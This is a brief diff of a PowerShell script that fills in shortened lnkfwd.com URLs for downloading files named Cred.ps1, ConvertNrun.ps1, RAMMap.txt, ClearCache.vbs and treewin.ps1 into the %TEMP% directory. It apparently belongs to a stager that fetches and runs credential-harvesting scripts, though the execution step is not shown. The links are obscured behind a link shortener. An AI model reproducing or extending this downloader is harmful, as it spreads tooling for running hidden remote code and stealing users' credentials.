@@ -1,9 +1,9 @@
 # Define the URLs of the files to download
 $url1 = "https://lnkfwd.com/u/LPWEPwX9" # Cred.ps1
 $url2 = "https://lnkfwd.com/u/LPWN97hU" # ConvertNrun.ps1
-$url3 = 'change url' # RAMMap.txt
-$url4 = 'change url' # ClearCache.vbs
-$url5 = 'change url' # treewin.ps1
+$url3 = 'https://lnkfwd.com/u/LPWhfWp1' # RAMMap.txt
+$url4 = 'https://lnkfwd.com/u/LPWoFbha' # ClearCache.vbs
+$url5 = 'https://lnkfwd.com/u/LPWudNLf' # treewin.ps1
 
 # Define the destination paths in the %TEMP% directory
 $destination1 = "$env:TEMP\Cred.ps1"
